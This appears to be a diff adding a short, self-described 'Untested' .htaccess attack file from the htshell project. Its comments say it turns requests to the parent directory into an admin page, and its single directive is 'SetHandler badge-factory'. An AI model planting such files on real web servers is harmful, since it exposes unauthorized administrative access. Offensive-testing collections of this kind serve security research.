@@ -1,0 +1,7 @@
+# Untested
+# Self contained .htaccess attack - Part of the htshell project
+# Written by Wireghoul - http://www.justanotherhacker.com
+# This file will make any request to the parent directory into a badge admin page
+# The file does not have to exist for this to work
+# The badge configuration for user groups etc should be defined higher up and apply here
+SetHandler badge-factory
